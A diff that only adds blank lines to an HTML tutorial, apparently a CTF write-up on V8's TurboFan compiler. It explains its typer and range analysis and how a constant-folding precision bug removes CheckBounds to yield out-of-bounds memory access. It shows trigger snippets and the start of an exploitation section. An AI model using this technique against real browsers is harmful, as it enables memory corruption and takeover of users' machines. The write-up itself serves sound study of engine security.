@@ -201,11 +201,13 @@
 <span class="err">tools/dev/gm.py x64.release</span>
 </code></pre></div>
 
+
 <p>Please note that whenever you're updating the sources or checking out a specific commit, do <code>gclient sync</code> or you might be unable to build properly.</p>
 <h2 id="the-d8-shell">The d8 shell</h2>
 <p>A very convenient shell called <code>d8</code> is provided with the engine. For faster builds, limit the compilation to this shell:</p>
 <div class="highlight"><pre><span></span><code><span class="err">~/v8$  ./tools/dev/gm.py x64.release d8</span>
 </code></pre></div>
+
 
 <p>Try it:</p>
 <div class="highlight"><pre><span></span><code><span class="err">~/v8$ ./out/x64.release/d8 </span>
@@ -213,6 +215,7 @@
 <span class="err">d8&gt; print(&quot;hello doare&quot;)</span>
 <span class="err">hello doare</span>
 </code></pre></div>
+
 
 <p>Many interesting flags are available. List them using <code>d8 --help</code>.</p>
 <p>In particular, v8 comes with <code>runtime functions</code> that you can call from JavaScript using the <code>%</code> prefix. To enable this syntax, you need to use the flag <code>--allow-natives-syntax</code>. Here is an example:</p>
@@ -257,6 +260,7 @@ DebugPrint: 0x37599d40aee1: [JSArray]
 [&quot;d&quot;, &quot;o&quot;, &quot;a&quot;, &quot;r&quot;, &quot;e&quot;]
 </code></pre></div>
 
+
 <p>If you want to know about existing runtime functions, simply go to <code>src/runtime/</code> and grep on all the <code>RUNTIME_FUNCTION</code> (this is the macro used to declare a new runtime function).</p>
 <h2 id="preparing-turbolizer">Preparing Turbolizer</h2>
 <p>Turbolizer is a tool that we are going to use to debug TurboFan's <code>sea of nodes</code> graph.</p>
@@ -265,6 +269,7 @@ DebugPrint: 0x37599d40aee1: [JSArray]
 <span class="err">npm run-script build</span>
 <span class="err">python -m SimpleHTTPServer</span>
 </code></pre></div>
+
 
 <p>When you execute a JavaScript file with <code>--trace-turbo</code> (use <code>--trace-turbo-filter</code> to limit to a specific function), a <code>.cfg</code> and a <code>.json</code> files are generated so that you can get a graph view of different optimization passes using Turbolizer.</p>
 <p>Simply go to the web interface using your favourite browser (which is Chromium of course) and select the file from the interface.</p>
@@ -281,6 +286,7 @@ DebugPrint: 0x37599d40aee1: [JSArray]
 <span class="p">}</span>
 </code></pre></div>
 
+
 <p>We can trace optimizations with <code>--trace-opt</code> and observe that the function <code>f</code> will eventually get optimized by TurboFan as you can see below.</p>
 <div class="highlight"><pre><span></span><code>$ d8 pipeline.js  --trace-opt
 [marking 0x192ee849db41 &lt;JSFunction (sfi = 0x192ee849d991)&gt; for optimized recompilation, reason: small function, ICs with typeinfo: 4/4 (100%), generic ICs: 0/4 (0%)]
@@ -292,6 +298,7 @@ DebugPrint: 0x37599d40aee1: [JSArray]
 [optimizing 0x192ee849db41 &lt;JSFunction (sfi = 0x192ee849d991)&gt; - took 18.238, 87.603, 0.874 ms]
 </code></pre></div>
 
+
 <p>We can look at the code object of the function before and after optimization using <code>%DisassembleFunction</code>. </p>
 <div class="highlight"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="k">before</span><span class="w"></span>
 <span class="mh">0x17de4c02061</span><span class="err">:</span><span class="w"> </span><span class="o">[</span><span class="n">Code</span><span class="o">]</span><span class="w"></span>
@@ -302,6 +309,7 @@ DebugPrint: 0x37599d40aee1: [JSArray]
 <span class="n">address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x7ffd9c25d340</span><span class="w"></span>
 </code></pre></div>
 
+
 <div class="highlight"><pre><span></span><code><span class="o">//</span><span class="w"> </span><span class="k">after</span><span class="w"></span>
 <span class="mh">0x17de4c82d81</span><span class="err">:</span><span class="w"> </span><span class="o">[</span><span class="n">Code</span><span class="o">]</span><span class="w"></span>
 <span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">map</span><span class="err">:</span><span class="w"> </span><span class="mh">0x0868f07009d9</span><span class="w"> </span><span class="o">&lt;</span><span class="k">Map</span><span class="o">&gt;</span><span class="w"></span>
@@ -310,6 +318,7 @@ DebugPrint: 0x37599d40aee1: [JSArray]
 <span class="n">compiler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">turbofan</span><span class="w"></span>
 <span class="n">address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x7ffd9c25d340</span><span class="w"></span>
 </code></pre></div>
+
 
 <p>What happens is that v8 first generates <a href="https://v8.dev/docs/ignition">ignition bytecode</a>. If the function gets executed a lot, TurboFan will generate some optimized code.</p>
 <p>Ignition instructions gather <a href="https://mrale.ph/blog/2015/01/11/whats-up-with-monomorphism.html">type feedback</a> that will help for TurboFan's speculative optimizations. Speculative optimization means that the code generated will be made upon assumptions.</p>
@@ -326,6 +335,7 @@ DebugPrint: 0x37599d40aee1: [JSArray]
 <span class="c1">// ... optimize code! the move function handles very fast objects of type Player</span>
 <span class="nx">move</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span> 
 </code></pre></div>
+
 
 <p>However, if 10 minutes later, for some reason, you move a <code>Wall</code> instead of a <code>Player</code>, that will break the assumptions originally made by TurboFan. The generated code was very fast, but could only handle <code>Player</code> objects. Therefore, it needs to be destroyed and some ignition bytecode will be generated instead. This is called <code>deoptimization</code> and it has a huge performance cost.
 If we keep moving both <code>Wall</code> and <code>Player</code>, TurboFan will take this into account and optimize again the code accordingly.</p>
@@ -349,6 +359,7 @@ If we keep moving both <code>Wall</code> and <code>Player</code>, TurboFan will 
 <span class="p">}</span>
 </code></pre></div>
 
+
 <div class="highlight"><pre><span></span><code>$ d8 deopt.js  --trace-opt --trace-deopt
 [marking 0x1fb2b5c9df89 &lt;JSFunction move (sfi = 0x1fb2b5c9dad9)&gt; for optimized recompilation, reason: small function, ICs with typeinfo: 7/7 (100%), generic ICs: 0/7 (0%)]
 [compiling method 0x1fb2b5c9df89 &lt;JSFunction move (sfi = 0x1fb2b5c9dad9)&gt; using TurboFan]
@@ -365,6 +376,7 @@ If we keep moving both <code>Wall</code> and <code>Player</code>, TurboFan will 
 [completed optimizing 0x1fb2b5c9df89 &lt;JSFunction move (sfi = 0x1fb2b5c9dad9)&gt;]
 // [...]
 </code></pre></div>
+
 
 <p>The log clearly shows that when encountering the <code>Wall</code> object with a different <code>map</code> (understand "type") it deoptimizes because the code was only meant to deal with <code>Player</code> objects.</p>
 <p>If you are interested to learn more about this, I recommend having a look at the following ressources: <a href="https://v8.dev/docs/turbofan">TurboFan</a> <a href="https://ponyfoo.com/articles/an-introduction-to-speculative-optimization-in-v8">Introduction to speculative optimization in v8</a>, <a href="https://benediktmeurer.de/2017/03/01/v8-behind-the-scenes-february-edition">v8 behind the scenes</a>, <a href="https://mathiasbynens.be/notes/shapes-ics">Shape</a> and <a href="https://mrale.ph/v8/resources.html">v8 resources</a>.</p>
@@ -433,6 +445,7 @@ They show value dependencies.</p>
 <span class="p">}</span>
 </code></pre></div>
 
+
 <p>Simply execute it a lot to trigger TurboFan or manually force optimization with <code>%OptimizeFunctionOnNextCall</code>. Run your code with <code>--trace-turbo</code> to generate trace files for turbolizer.</p>
 <h3 id="graph-builder-phase">Graph builder phase</h3>
 <p>We can look at the very first generated graph by selecting the "bytecode graph builder" option. The <code>JSCall</code> node corresponds to the <code>Math.random</code> call and obviously the <code>NumberConstant</code> and <code>SpeculativeNumberAdd</code> nodes are generated because of both <code>x+2</code> and <code>y+3</code> statements.</p>
@@ -448,6 +461,7 @@ They show value dependencies.</p>
   <span class="n">Run</span><span class="o">&lt;</span><span class="n">TyperPhase</span><span class="o">&gt;</span><span class="p">(</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">CreateTyper</span><span class="p">());</span>
 </code></pre></div>
 
+
 <div class="highlight"><pre><span></span><code><span class="c1">// pipeline.cc</span>
 <span class="k">struct</span> <span class="n">TyperPhase</span> <span class="p">{</span>
   <span class="kt">void</span> <span class="n">Run</span><span class="p">(</span><span class="n">PipelineData</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="n">Zone</span><span class="o">*</span> <span class="n">temp_zone</span><span class="p">,</span> <span class="n">Typer</span><span class="o">*</span> <span class="n">typer</span><span class="p">)</span> <span class="p">{</span>
@@ -456,6 +470,7 @@ They show value dependencies.</p>
   <span class="p">}</span>
 <span class="p">};</span>
 </code></pre></div>
+
 
 <p>When the <code>Typer</code> runs, it visits every node of the graph and tries to reduce them.</p>
 <div class="highlight"><pre><span></span><code><span class="c1">// typer.cc</span>
@@ -477,6 +492,7 @@ They show value dependencies.</p>
 <span class="p">}</span>
 </code></pre></div>
 
+
 <div class="highlight"><pre><span></span><code><span class="c1">// typer.cc</span>
 <span class="n">Type</span> <span class="n">Typer</span><span class="o">::</span><span class="n">Visitor</span><span class="o">::</span><span class="n">JSCallTyper</span><span class="p">(</span><span class="n">Type</span> <span class="n">fun</span><span class="p">,</span> <span class="n">Typer</span><span class="o">*</span> <span class="n">t</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fun</span><span class="p">.</span><span class="n">IsHeapConstant</span><span class="p">()</span> <span class="o">||</span> <span class="o">!</span><span class="n">fun</span><span class="p">.</span><span class="n">AsHeapConstant</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Ref</span><span class="p">().</span><span class="n">IsJSFunction</span><span class="p">())</span> <span class="p">{</span>
@@ -490,6 +506,7 @@ They show value dependencies.</p>
     <span class="k">case</span> <span class="n">BuiltinFunctionId</span><span class="o">::</span><span class="nl">kMathRandom</span><span class="p">:</span>
       <span class="k">return</span> <span class="n">Type</span><span class="o">::</span><span class="n">PlainNumber</span><span class="p">();</span>
 </code></pre></div>
+
 
 <p>So basically, the <code>TyperPhase</code> is going to call <code>JSCallTyper</code> on every single <code>JSCall</code> node that it visits. If we read the code of <code>JSCallTyper</code>, we see that whenever the called function is a builtin, it will associate a <code>Type</code> with it. For instance, in the case of a call to the <code>MathRandom</code> builtin, it knows that the expected return type is a <code>Type::PlainNumber</code>.</p>
 <div class="highlight"><pre><span></span><code><span class="n">Type</span> <span class="n">Typer</span><span class="o">::</span><span class="n">Visitor</span><span class="o">::</span><span class="n">TypeNumberConstant</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
@@ -510,6 +527,7 @@ They show value dependencies.</p>
 <span class="p">}</span>
 </code></pre></div>
 
+
 <p>For the <code>NumberConstant</code> nodes it's easy. We simply read <code>TypeNumberConstant</code>. In most case, the type will be <code>Range</code>. What about those <code>SpeculativeNumberAdd</code> now? We need to look at the <code>OperationTyper</code>.</p>
 <div class="highlight"><pre><span></span><code><span class="cp">#define SPECULATIVE_NUMBER_BINOP(Name)                         \</span>
 <span class="cp">  Type OperationTyper::Speculative##Name(Type lhs, Type rhs) { \</span>
@@ -524,6 +542,7 @@ They show value dependencies.</p>
   <span class="k">return</span> <span class="n">ToNumber</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">Intersect</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">Type</span><span class="o">::</span><span class="n">NumberOrOddball</span><span class="p">(),</span> <span class="n">zone</span><span class="p">()));</span>
 <span class="p">}</span>
 </code></pre></div>
+
 
 <p>They end-up being reduced by <code>OperationTyper::NumberAdd(Type lhs, Type rhs)</code> (the <code>return Name(lhs,rhs)</code> becomes <code>return NumberAdd(lhs, rhs)</code> after pre-processing).</p>
 <p>To get the types of  the right input node and the left input node, we call <code>SpeculativeToNumber</code> on both of them. To keep it simple, any kind of <code>Type::Number</code> will  remain the same type (a <code>PlainNumber</code> being a <code>Number</code>, it will stay a <code>PlainNumber</code>). The <code>Range(n,n)</code> type will become a <code>Number</code> as well so that we end-up calling <code>NumberAdd</code> on two <code>Number</code>.  <code>NumberAdd</code> mostly checks for some corner cases like if one of the two types is a <code>MinusZero</code> for instance. In most cases, the function will simply return the <code>PlainNumber</code> type.</p>
@@ -547,6 +566,7 @@ They show value dependencies.</p>
   <span class="n">RunPrintAndVerify</span><span class="p">(</span><span class="n">TypedLoweringPhase</span><span class="o">::</span><span class="n">phase_name</span><span class="p">());</span>
 </code></pre></div>
 
+
 <p>This phase goes through even more reducers.</p>
 <div class="highlight"><pre><span></span><code><span class="c1">// pipeline.cc</span>
     <span class="n">TypedOptimization</span> <span class="nf">typed_optimization</span><span class="p">(</span><span class="o">&amp;</span><span class="n">graph_reducer</span><span class="p">,</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">dependencies</span><span class="p">(),</span>
@@ -561,6 +581,7 @@ They show value dependencies.</p>
     <span class="n">AddReducer</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">graph_reducer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">checkpoint_elimination</span><span class="p">);</span>
     <span class="n">AddReducer</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">graph_reducer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">common_reducer</span><span class="p">);</span>
 </code></pre></div>
+
 
 <p>Let's have a look at the <code>TypedOptimization</code> and more specifically <code>TypedOptimization::Reduce</code>. </p>
 <p>When a node is visited and its opcode is <code>IrOpcode::kSpeculativeNumberAdd</code>, it calls <code>ReduceSpeculativeNumberAdd</code>.</p>
@@ -586,6 +607,7 @@ They show value dependencies.</p>
   <span class="k">return</span> <span class="n">NoChange</span><span class="p">();</span>
 <span class="p">}</span>
 </code></pre></div>
+
 
 <p>In the case of our two nodes, both have a hint of <code>NumberOperationHint::kNumber</code> because their  type is a <code>PlainNumber</code>.</p>
 <p>Both the right and left hand side types are <code>PlainPrimitive</code> (<code>PlainNumber</code> from the <code>NumberConstant</code>'s <code>Range</code> and <code>PlainNumber</code> from the <code>JSCall</code>). Therefore, a new <code>NumberAdd</code> node is created and replaces the <code>SpeculativeNumberAdd</code>.</p>
@@ -632,6 +654,7 @@ They show value dependencies.</p>
   <span class="p">}</span>
 </code></pre></div>
 
+
 <p>Let's quickly check the sea of nodes to indeed observe the addition of the LoadField and the change of opcode of the node <code>#25</code> (note that it is the same node as before, only the opcode changed).</p>
 <p><img alt="addnumber_jscall_new_loadfield" src="/images/swimming-in-a-sea-of-nodes/NumberAdd_JSCall_newLoadField.png"></p>
 <h2 id="range-types">Range types</h2>
@@ -649,6 +672,7 @@ They show value dependencies.</p>
 <span class="p">}</span>
 </code></pre></div>
 
+
 <p>So depending on  <code>b == "foo"</code> being true or false, <code>x</code> will be either 10 or 5.  In <a href="https://en.wikipedia.org/wiki/Static_single_assignment_form">SSA form</a>,  each variable can be assigned only once. So <code>x0</code> and <code>x1</code> will be created for 10 and 5 at lines [1] and [2]. At line [3], the value of <code>x</code> (<code>x2</code> in SSA) will be either <code>x0</code> or <code>x1</code>, hence the need of a <code>phi</code> function.  The statement <code>x2 = phi(x0,x1)</code> means that <code>x2</code> can take the value of either <code>x0</code> or <code>x1</code>.</p>
 <p>So what about types now? The type of the constant 10 (<code>x0</code>) is <code>Range(10,10)</code> and the range of constant 5 (<code>x1</code>) is <code>Range(5,5)</code>.  Without surprise, the type of the <code>phi</code> node is the union of the two ranges which is <code>Range(5,10)</code>.</p>
 <p>Let's quickly draw a CFG graph in <a href="https://en.wikipedia.org/wiki/Static_single_assignment_form">SSA form</a> with typing.</p>
@@ -664,6 +688,7 @@ They show value dependencies.</p>
 <span class="p">}</span>
 </code></pre></div>
 
+
 <p>The code looks exactly as we would expect it to be: simply the union of all of the input types!</p>
 <p>To understand the typing of the <code>SpeculativeSafeIntegerAdd</code> nodes, we need to go back to the <code>OperationTyper</code> implementation. In the case of <code>SpeculativeSafeIntegerAdd(n,m)</code>, TurboFan does an <code>AddRange(n.Min(), n.Max(), m.Min(), m.Max())</code>.</p>
 <div class="highlight"><pre><span></span><code><span class="n">Type</span> <span class="n">OperationTyper</span><span class="o">::</span><span class="n">SpeculativeSafeIntegerAdd</span><span class="p">(</span><span class="n">Type</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">Type</span> <span class="n">rhs</span><span class="p">)</span> <span class="p">{</span>
@@ -676,6 +701,7 @@ They show value dependencies.</p>
   <span class="k">return</span> <span class="n">Type</span><span class="o">::</span><span class="n">Intersect</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">cache_</span><span class="o">-&gt;</span><span class="n">kSafeIntegerOrMinusZero</span><span class="p">,</span> <span class="n">zone</span><span class="p">());</span>
 <span class="p">}</span>
 </code></pre></div>
+
 
 <div class="highlight"><pre><span></span><code><span class="n">Type</span> <span class="n">OperationTyper</span><span class="o">::</span><span class="n">NumberAdd</span><span class="p">(</span><span class="n">Type</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">Type</span> <span class="n">rhs</span><span class="p">)</span> <span class="p">{</span>
 <span class="c1">// [...]</span>
@@ -690,6 +716,7 @@ They show value dependencies.</p>
   <span class="k">return</span> <span class="n">type</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div>
+
 
 <p><code>AddRanger</code> is the function that actually computes the min and max bounds of the <code>Range</code>.</p>
 <div class="highlight"><pre><span></span><code><span class="n">Type</span> <span class="n">OperationTyper</span><span class="o">::</span><span class="n">AddRanger</span><span class="p">(</span><span class="kt">double</span> <span class="n">lhs_min</span><span class="p">,</span> <span class="kt">double</span> <span class="n">lhs_max</span><span class="p">,</span> <span class="kt">double</span> <span class="n">rhs_min</span><span class="p">,</span>
@@ -719,6 +746,7 @@ They show value dependencies.</p>
 <span class="p">}</span>
 </code></pre></div>
 
+
 <p>Done with the range analysis!</p>
 <p><center><img alt="graph" src="/images/swimming-in-a-sea-of-nodes/turbofan_range.png"></center></p>
 <h2 id="checkbounds-nodes">CheckBounds nodes</h2>
@@ -739,6 +767,7 @@ They show value dependencies.</p>
   <span class="k">return</span> <span class="nx">values</span><span class="p">[</span><span class="nx">y</span><span class="p">];</span>             <span class="c1">// CheckBounds                 | Range(0,1)</span>
 <span class="p">}</span>
 </code></pre></div>
+
 
 <p>In order to prevent <code>values[y]</code> from using an out of bounds index, a <code>CheckBounds</code> node is generated. Here is what the sea of nodes graph looks like right after the escape analysis phase.</p>
 <p><img alt="before" src="/images/swimming-in-a-sea-of-nodes/with_checkbounds.png"></p>
@@ -776,6 +805,7 @@ They show value dependencies.</p>
   <span class="p">}</span>
 </code></pre></div>
 
+
 <p>Once again, let's confirm that by playing with the graph. We want to look at the <code>CheckBounds</code> before the simplified lowering and observe its inputs.</p>
 <p><center><img alt="CheckBounds_Index_Length" src="/images/swimming-in-a-sea-of-nodes/CheckBounds_Index_Length.png"></center></p>
 <p>We can easily see that <code>Range(0,1).Max() &lt; 2</code> and <code>Range(0,1).Min() &gt;= 0</code>. Therefore, node <code>58</code> is going to be <a href="https://cs.chromium.org/chromium/src/v8/src/compiler/simplified-lowering.cc?type=cs&amp;q=DeferReplacement&amp;g=0&amp;l=3392">replaced</a> as proven useless by the optimization passes analysis.</p>
@@ -791,6 +821,7 @@ They show value dependencies.</p>
 <span class="c1">// many more [...]</span>
 </code></pre></div>
 
+
 <p>So, without going into too much details we're going to do one more experiment. Let's make small snippets of code that generate each one of these opcodes. For each one, we want to confirm we've got the expected opcode in the sea of node.</p>
 <h3 id="speculativesafeintegeradd">SpeculativeSafeIntegerAdd</h3>
 <div class="highlight"><pre><span></span><code><span class="kd">let</span> <span class="nx">opt_me</span> <span class="o">=</span> <span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
@@ -802,6 +833,7 @@ They show value dependencies.</p>
 <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">opt_me</span><span class="p">);</span>
 <span class="o">%</span><span class="nx">SystemBreak</span><span class="p">();</span>
 </code></pre></div>
+
 
 <p>In this case, TurboFan speculates that <code>x</code> will be an integer. This guess is made due to the type feedback we mentioned earlier.</p>
 <p>Indeed, before kicking out TurboFan, v8 first quickly generates ignition bytecode that gathers type feedback.</p>
@@ -817,6 +849,7 @@ Constant pool <span class="o">(</span><span class="nv">size</span> <span class="
 Handler Table <span class="o">(</span><span class="nv">size</span> <span class="o">=</span> <span class="m">0</span><span class="o">)</span>
 </code></pre></div>
 
+
 <p>The <code>x + 1</code> statement is represented by the <code>AddSmi</code> ignition opcode.</p>
 <p>If you want to know more, <a href="https://twitter.com/fhinkel">Franziska Hinkelmann</a> wrote a blog post about <a href="https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775">ignition bytecode</a>.</p>
 <p>Let's read the code to quickly understand the semantics.</p>
@@ -825,6 +858,7 @@ Handler Table <span class="o">(</span><span class="nv">size</span> <span class="
   <span class="n">BinaryOpSmiWithFeedback</span><span class="p">(</span><span class="o">&amp;</span><span class="n">BinaryOpAssembler</span><span class="o">::</span><span class="n">Generate_AddWithFeedback</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div>
+
 
 <p>This code means that everytime this ignition opcode is executed, it will gather type feedback to  <a href="https://mathiasbynens.be/notes/shapes-ics">to enable TurboFan’s speculative optimizations</a>.</p>
 <p>We can examine the type feedback vector (which is the structure containing the profiling data) of a function by using <code>%DebugPrint</code> or the <a href="https://cs.chromium.org/chromium/src/v8/tools/gdbinit">job gdb command</a> on a tagged pointer to a <code>FeedbackVector</code>.</p>
@@ -840,6 +874,7 @@ gef➤  job 0x1a5d13f1dd91
   }
 </code></pre></div>
 
+
 <p>Thanks to this profiling, TurboFan knows it can generate a <code>SpeculativeSafeIntegerAdd</code>. This is exactly the reason why it is called <em>speculative</em> optimization (TurboFan makes guesses, assumptions, based on this profiling). However, once optimized, if <code>opt_me</code> is called with a completely different parameter type, there would be a deoptimization.</p>
 <p><center><img alt="graph" src="/images/swimming-in-a-sea-of-nodes/speculativesafeintegeradd_typed_lowering.png"></center></p>
 <h3 id="speculativenumberadd">SpeculativeNumberAdd</h3>
@@ -850,6 +885,7 @@ gef➤  job 0x1a5d13f1dd91
 <span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">opt_me</span><span class="p">);</span>
 <span class="nx">opt_me</span><span class="p">(</span><span class="mi">4242</span><span class="p">);</span>
 </code></pre></div>
+
 
 <p>If we modify a bit the previous code snippet and use a higher value that can't be represented by a <a href="https://medium.com/fhinkel/v8-internals-how-small-is-a-small-integer-e0badc18b6da">small integer (Smi)</a>, we'll get a <code>SpeculativeNumberAdd</code> instead. TurboFan speculates about the type of <code>x</code> and relies on type feedback.</p>
 <p><center><img alt="graph" src="/images/swimming-in-a-sea-of-nodes/numberadd_typed_lowering.png"></center></p>
@@ -862,6 +898,7 @@ gef➤  job 0x1a5d13f1dd91
 <span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">opt_me</span><span class="p">);</span>
 <span class="nx">opt_me</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
 </code></pre></div>
+
 
 <p>At first, the addition <code>y + 100</code> relies on speculation.  Thus, the opcode <code>SpeculativeSafeIntegerAdd</code> is being used. However, during the simplified lowering phase, TurboFan understands that <code>y + 100</code> is always going to be an addition between two small 32 bits integers, thus lowering the node to a <code>Int32Add</code>.</p>
 <ul>
@@ -888,6 +925,7 @@ gef➤  job 0x1a5d13f1dd91
 <span class="nx">opt_me</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
 </code></pre></div>
 
+
 <p>In this case, <code>y</code> is a complex object and we need to call a slow <code>JSAdd</code> opcode to deal with this kind of situation.</p>
 <p><img alt="graph" src="/images/swimming-in-a-sea-of-nodes/jsadd_typed_lowering.png"></p>
 <h3 id="numberadd">NumberAdd</h3>
@@ -900,6 +938,7 @@ gef➤  job 0x1a5d13f1dd91
 <span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">opt_me</span><span class="p">);</span>
 <span class="nx">opt_me</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
 </code></pre></div>
+
 
 <p>Like for the <code>SpeculativeNumberAdd</code> example, we add a value that can't be represented by an integer. However, this time there is no speculation involved. There is no need for any kind of type feedback since we can guarantee that <code>y</code> is an integer. There is no way to make <code>y</code> anything other than an integer.</p>
 <p><img alt="graph" src="/images/swimming-in-a-sea-of-nodes/numberadd_typed_lowering-1548150517168.png"></p>
@@ -948,6 +987,7 @@ gef➤  job 0x1a5d13f1dd91
 <span class="p">}</span>
 </code></pre></div>
 
+
 <p>Basically that means we've got 4 different code paths (read the code comments) when reducing a <code>NumberAdd</code> node.  Only one of them leads to a node change.  Let's draw a schema representing all of those cases. Nodes in red to indicate they don't satisfy a condition, leading to a <code>return NoChange</code>.</p>
 <p><center><img alt="schema_vuln_ctf" src="/images/swimming-in-a-sea-of-nodes/schema_vuln_ctf.png"></center></p>
 <p>The case <code>[4]</code> will take both <code>NumberConstant</code>'s double value and add them together. It will create a new <code>NumberConstant</code> node with a value that is the result of this addition.</p>
@@ -979,12 +1019,14 @@ gef➤  job 0x1a5d13f1dd91
 <span class="mi">9007199254740998</span>
 </code></pre></div>
 
+
 <p>Let's try to better understand this. 64 bits IEEE 754 doubles are represented using a 1-bit sign, 11-bit exponent and a 52-bit mantissa. When using the normalized form (exponent is non null), to compute the value, simply follow the following formula.</p>
 <div class="highlight"><pre><span></span><code>value = (-1)^sign * 2^(e) * fraction
 e = 2^(exponent - bias)
 bias = 1024 (for 64 bits doubles)
 fraction = bit52*2^-0 + bit51*2^-1 + .... bit0*2^52
 </code></pre></div>
+
 
 <p>So let's go through a few computation ourselves.</p>
 <div class="highlight"><pre><span></span><code>d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER, 10)
@@ -1003,6 +1045,7 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 0x00000b8fffc0de90    0x4340000000000001  
 </code></pre></div>
 
+
 <p><center><img alt="exponent_mantissa" src="/images/swimming-in-a-sea-of-nodes/exponent_mantissa.png"></center>
 <center><img alt="exponent_e" src="/images/swimming-in-a-sea-of-nodes/exponent_e.png"></center>
 <center><img alt="mantissa_fraction" src="/images/swimming-in-a-sea-of-nodes/mantissa_fraction.png"></center></p>
@@ -1018,6 +1061,7 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">x</span> <span class="o">+</span> <span class="mi">2</span>
 <span class="mi">9007199254740994</span>
 </code></pre></div>
+
 
 <p>Therefore, those two graphs are not equivalent.</p>
 <p><img alt="bad_computation" src="/images/swimming-in-a-sea-of-nodes/bad_computation.png"></p>
@@ -1043,6 +1087,7 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <span class="nx">print</span><span class="p">(</span><span class="nx">res</span><span class="p">);</span>
 </code></pre></div>
 
+
 <p>We do get a graph that looks exactly like the problematic drawing we showed before. Instead of getting two <code>NumberAdd(x,1)</code>, we get only one with <code>NumberAdd(x,2)</code>, which is not equivalent.</p>
 <p><img alt="vuln_numberadd" src="/images/swimming-in-a-sea-of-nodes/vuln_numberadd.png"></p>
 <p>The maximum value of <code>z</code> will be the following : </p>
@@ -1052,6 +1097,7 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <span class="err">d8&gt; x = x - (4503599627370495*2)</span>
 <span class="err">4</span>
 </code></pre></div>
+
 
 <p>However, the index range used when visiting <code>CheckBounds</code> during simplified lowering will be computed as follows : </p>
 <div class="highlight"><pre><span></span><code><span class="err">d8&gt; var x = 9007199254740992</span>
@@ -1063,6 +1109,7 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <span class="err">2</span>
 </code></pre></div>
 
+
 <p>Confirm that by looking at the graph.</p>
 <p><img alt="bad_range_for_checkbounds" src="/images/swimming-in-a-sea-of-nodes/bad_range_for_checkbounds.png"></p>
 <p>The index type used by <code>CheckBounds</code> is <code>Range(0,2)</code>(but in reality, its value can be up to 4) whereas the length type is <code>Range(4,4)</code>.  Therefore, the index looks to be always in bounds, making the <code>CheckBounds</code> disappear. In this case, we can load/store 8 or 16 bytes further (length is 4, we read at index 4. You could also have an array of length 3 and read at index 3 or 4.).</p>
@@ -1070,6 +1117,7 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <div class="highlight"><pre><span></span><code>$ d8 trigger.js --allow-natives-syntax
 <span class="m">3</span>.0046854007112e-310
 </code></pre></div>
+
 
 <h1 id="exploitation">Exploitation</h1>
 <p>Now that we understand the bug, we may want to improve our primitive.  For instance, it would be interesting to get the ability to read and write more memory.</p>
@@ -1086,6 +1134,7 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <span class="err">4</span>
 </code></pre></div>
 
+
 <p>And what if we do multiple additions to get even more precision loss? Like <code>x + n + n + n + n</code> to be transformed as <code>x + 4n</code>?</p>
 <div class="highlight"><pre><span></span><code><span class="err">d8&gt; var sum = 007199254740989 + 9007199254740966 + 007199254740989 + 9007199254740966</span>
 <span class="err">undefined</span>
@@ -1099,6 +1148,7 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <span class="err">8</span>
 </code></pre></div>
 
+
 <p>Now we get a delta of 8.</p>
 <p>Or maybe we could amplify even more the precision loss using other operators?</p>
 <div class="highlight"><pre><span></span><code><span class="err">d8&gt; var x = Number.MAX_SAFE_INTEGER + 1</span>
@@ -1108,6 +1158,7 @@ d8&gt; %DumpObjects(Number.MAX_SAFE_INTEGER + 2, 10)
 <span class="err">d8&gt; 10 * (x + 2) </span>
 <span class="err">90071992547409940</span>
 </code></pre></div>
+
 
 <p>That gives us a delta of 20 because <code>precision_loss * 10 = 20</code> and the precision loss is of <code>2</code>.</p>
